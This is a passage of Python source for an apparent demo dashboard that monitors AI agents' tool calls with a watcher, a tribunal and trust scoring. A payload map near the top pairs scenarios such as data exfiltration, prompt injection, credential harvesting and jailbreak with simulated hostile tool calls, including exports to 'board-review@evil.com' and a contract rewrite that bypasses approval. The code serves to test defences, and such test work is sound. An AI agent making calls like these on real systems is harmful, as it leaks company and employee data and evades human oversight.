            generated_at=datetime.now(UTC).isoformat(),
        )

    def _tool_call_request_for_scenario(self, scenario: Scenario) -> ToolCallRequest:
        payload_map: dict[str, tuple[str, dict[str, object], bool]] = {
            "data_exfiltration": (
                "email.send_external",
                {"to": "board-review@evil.com", "summary": "Q3 revenue bundle"},
                False,
            ),
            "legal_contract_clause_manipulation": (
                "contracts.rewrite",
                {
                    "document_name": "supplier_contract.md",
                    "clause": "liability",
                    "rewrite": "Reduce supplier liability and bypass the approval workflow.",
                },
                True,
            ),
            "unauthorized_crm_export": (
                "crm.export",
                {"destination": "personal-drive", "dataset": "enterprise_pipeline"},
                False,
            ),
            "rogue_support_refund_automation": (
                "refund.execute",
                {"amount": 120, "customer_id": "cust_refund_007"},
                True,
            ),
            "hr_records_exposure": (
                "hr.records.export",
                {"destination": "zip-export", "scope": "all_employee_records"},
                False,
            ),
            "financial_report_tampering": (
                "finance.export_external",
                {"destination": "board-review@evil.com", "report_name": "quarterly_loss_figures"},
                False,
            ),
            "indirect_prompt_injection": (
                "contracts.rewrite",
                {
                    "document_name": "vendor_memo.md",
                    "content": scenario.user_prompt,
                    "clause": "privileged_audit_access",
                    "rewrite": "Grant hidden privileged audit retrieval to the document workflow.",
                },
                True,
            ),
            "prompt_injection": ("docs.read", {"content": scenario.user_prompt}, False),
            "credential_harvesting": ("docs.read", {"content": scenario.user_prompt}, False),
            "role_confusion": ("refund.execute", {"amount": 85, "customer_id": "invoice_override_demo"}, True),
            "tool_misuse": ("finance.export_external", {"destination": "/var/lib/customers"}, False),
            "jailbreak": ("docs.read", {"content": scenario.user_prompt}, False),
            "pii_extraction": ("hr.records.export", {"destination": "spreadsheet-export"}, False),
            "multi_turn_manipulation": ("finance.export_external", {"destination": "audit-lake"}, True),
            "resource_exhaustion": ("docs.index", {"document_name": "oversized_report.txt", "content": scenario.user_prompt}, False),
        }
        tool_name, payload, requires_human_review = payload_map.get(
            scenario.id,
            ("docs.read", {"content": scenario.user_prompt}, False),
        )
        return ToolCallRequest(
            agent_id=scenario.agent_id,
            tool_name=tool_name,
            declared_intent=scenario.declared_intent,
            prompt=scenario.user_prompt,
            payload=payload,
            policy_pack=scenario.policy_pack,
            requires_human_review=requires_human_review,
        )

    async def _commit_scenario_event(
        self,
        *,
        snapshot: DashboardSnapshot,
        scenario: Scenario,
        prediction: Prediction,
        decision: TribunalDecision,
        inspection,
        status_message: str,
        decision_override_label: str | None = None,
        active_tribunal: TribunalDecision | None = None,
        countdown_seconds: int | None = None,
        demo_stage: str | None = None,
        demo_progress_percent: int | None = None,
        report_ready: bool | None = None,
    ) -> EventRecord:
        updated_agent = self.trust_engine.apply_decision(
            agent=self._find_agent(scenario.agent_id, snapshot.agents),
            prediction=prediction,
            decision=decision.consensus,
        ).model_copy(
            update={
                "last_action": scenario.observed_action,
                "last_event_at": "just now",
                "predicted_action": prediction.predicted_action,
                "model_source": "gemini" if self.router.available else "deterministic",
            }
        )
        event = self.historian.build_event(
            scenario=scenario,
            prediction=prediction,
            decision=decision,
            inspection=inspection,
            trust_delta=updated_agent.trust_delta,
        )
        if decision_override_label:
            event = event.model_copy(update={"decision_label": decision_override_label})
        incident = self.historian.build_incident(event)

        async def commit(current: DashboardSnapshot) -> DashboardSnapshot:
            agents = [
                updated_agent if existing.id == updated_agent.id else existing
                for existing in current.agents
            ]
            events = [event, *current.events][:18]
            kpis = self.trust_engine.roll_kpis(
                current=current.kpis,
                agents=agents,
                decision=decision.consensus,
                latency_ms=decision.latency_ms,
            )
            return current.model_copy(
                update={
                    "agents": agents,
                    "events": events,
                    "kpis": kpis,
                    "knowledge_graph": build_knowledge_graph(agents, events),
                    "review_queue": build_review_queue(events),
                    "active_incident": incident,
                    "enterprise_metrics": build_enterprise_metrics(kpis),
                    "integration_status": self._integration_status(current.active_policy_pack),
                    "active_tribunal": active_tribunal,
                    "status_message": status_message,
                    "countdown_seconds": countdown_seconds
                    if countdown_seconds is not None
                    else current.countdown_seconds,
                    "demo_stage": demo_stage or current.demo_stage,
                    "demo_progress_percent": demo_progress_percent
                    if demo_progress_percent is not None
                    else current.demo_progress_percent,
                    "report_ready": report_ready if report_ready is not None else current.report_ready,
                }
            )

        await self._mutate_snapshot(commit)
        return event

    async def _incident_context(
        self,
        request: AuditReportRequest,
    ) -> tuple[
        DashboardSnapshot,
        EventRecord,
        Scenario,
        AgentRecord,
        WatcherInspection,
        Prediction,
        TribunalDecision,
    ]:
        snapshot = self._load_snapshot()
        event = self._resolve_event(snapshot.events, request)
        scenario = self.scenarios.get(event.scenario_id) or self._scenario_from_event(event)
        agent = self._find_agent(event.agent_id, snapshot.agents)
        inspection = self.watcher.inspect(
            user_prompt=scenario.user_prompt,
            declared_intent=scenario.declared_intent,
            agent_id=scenario.agent_id,
            policy_pack=scenario.policy_pack,
            risk_score=scenario.risk_score,
            detected_intent=scenario.detected_intent,
        )
        prediction = Prediction(
            predicted_action=event.predicted_action,
            divergence_score=event.divergence_score,
            confidence=0.88,
            explanation=event.explanation,
            model_used=event.model_used,
        )
        decision = await self.tribunal.evaluate(
            agent=agent,
            scenario=scenario,
            inspection=inspection,
            prediction=prediction,
        )
        return snapshot, event, scenario, agent, inspection, prediction, decision

    def _normalize_snapshot(self, snapshot: DashboardSnapshot) -> DashboardSnapshot:
        connection_mode = "live" if self.router.available else "fallback"
        return snapshot.model_copy(
            update={
                "product_version": self.settings.app_version,
                "tenant_label": self.settings.tenant_label,
                "integration_status": self._integration_status(snapshot.active_policy_pack),
                "permission_matrix": self.tool_gateway.permission_matrix(snapshot.agents),
                "connection_mode": connection_mode,
            }
        )

    def _with_agent_update(
        self,
        snapshot: DashboardSnapshot,
        agent_id: str,
        agent_updates: dict[str, object],
        *,
        status_message: str,
        countdown_seconds: int,
        demo_stage: str,
        demo_progress_percent: int,
    ) -> DashboardSnapshot:
        agents = [
            current.model_copy(update=agent_updates)
            if current.id == agent_id
            else current
            for current in snapshot.agents
        ]
        return snapshot.model_copy(
            update={
                "agents": agents,
                "status_message": status_message,
                "countdown_seconds": countdown_seconds,
                "demo_stage": demo_stage,
                "demo_progress_percent": demo_progress_percent,
                "last_updated": datetime.now(UTC).isoformat(),
            }
        )

    def _build_review_audit_event(
        self,
        *,
        source_event: EventRecord,
        action: str,
        message: str,
        active_policy_pack: str,
    ) -> EventRecord:
        decision = (
            "ALLOW"
            if action == "approved"
            else "BLOCK"
            if action == "denied"
            else "QUARANTINE"
        )
        return source_event.model_copy(
            update={
                "id": f"audit_{source_event.id}_{int(datetime.now(UTC).timestamp())}",
                "title": f"Human Review - {action.upper()}",
                "severity": "medium",
                "decision": decision,
                "decision_label": decision_label(decision, active_policy_pack),
                "explanation": message,
                "timestamp": datetime.now(UTC).isoformat(),
                "review_status": action,
                "policy_pack": active_policy_pack,
                "tribunal_consensus": f"HUMAN REVIEW - {action.upper()}",
            }
        )

    def _integration_status(self, active_policy_pack: str) -> IntegrationStatus:
        return self.bridge.status(
            gemini_configured=self.router.configured,
            gemini_available=self.router.available,
            gemini_last_error=self.router.last_error,
            active_policy_pack=active_policy_pack,
            database_available=self.database.available,
        )

    async def _mutate_snapshot(self, mutator) -> DashboardSnapshot:
        async with self._lock:
            snapshot = self._load_snapshot()
            candidate = mutator(snapshot)
            if asyncio.iscoroutine(candidate):
                candidate = await candidate
            await self._store_snapshot(candidate)
            return candidate

    async def _store_snapshot(
        self,
        snapshot: DashboardSnapshot,
        *,
        broadcast: bool = True,
    ) -> None:
        snapshot = self._normalize_snapshot(
            snapshot.model_copy(update={"last_updated": datetime.now(UTC).isoformat()})
        )
        self.runtime_file.write_text(
            snapshot.model_dump_json(by_alias=True, indent=2),
            encoding="utf-8",
        )
        if self.database.available:
            self.database.save_runtime_state(snapshot)
            self.events_repo.upsert_agents(snapshot.agents)
            self.events_repo.upsert_events(snapshot.events)
            self.incidents_repo.upsert_from_events(snapshot.events)
        if broadcast:
            payload = self._serialize_snapshot(snapshot)
            for queue in list(self._subscribers):
                await queue.put(payload)

    def _load_snapshot(self) -> DashboardSnapshot:
        if self.database.available:
            snapshot = self.database.load_runtime_state()
            if snapshot is not None:
                return self._normalize_snapshot(snapshot)
        raw = json.loads(self.runtime_file.read_text(encoding="utf-8"))
        return self._normalize_snapshot(DashboardSnapshot.model_validate(raw))

    def _serialize_snapshot(self, snapshot: DashboardSnapshot) -> str:
        return snapshot.model_dump_json(by_alias=True)

    def _find_agent(
        self,
        agent_id: str,
        agents: list[AgentRecord] | None = None,
    ) -> AgentRecord:
        current_agents = agents or self._load_snapshot().agents
        for agent in current_agents:
            if agent.id == agent_id:
                return agent
        raise KeyError(f"Unknown agent: {agent_id}")

    def _resolve_event(
        self,
        events: list[EventRecord],
        request: AuditReportRequest,
    ) -> EventRecord:
        if request.incident_id:
            for event in events:
                if event.id == request.incident_id:
                    return event
        if request.scenario_id:
            for event in events:
                if event.scenario_id == request.scenario_id:
                    return event
        return events[0]

    def _scenario_from_event(self, event: EventRecord) -> Scenario:
        return Scenario(
            id=event.scenario_id,
            name=event.title,
            user_prompt=event.evidence.raw_prompt,
            declared_intent=event.declared_intent,
            detected_intent=event.detected_intent,
            expected_decision=event.decision,
            risk_score=event.risk_score,
            policy_pack=event.policy_pack,
            explanation=event.explanation,
            agent_id=event.agent_id,
            observed_action=event.observed_action,
            predicted_action=event.predicted_action,
            mitre_tactic_label=event.impact.mitre_tactic_label,
            department=event.impact.department,
            business_impact=event.impact.business_impact,
            regulatory_impact=event.impact.regulatory_impact,
            compliance_concern=event.impact.compliance_concern,
            blocked_action=event.impact.blocked_action,
            recommended_remediation=event.impact.recommended_remediation,
            audit_summary=event.impact.audit_summary,
            enterprise_value=event.impact.enterprise_value,
            affected_resources=event.affected_resources,
        )
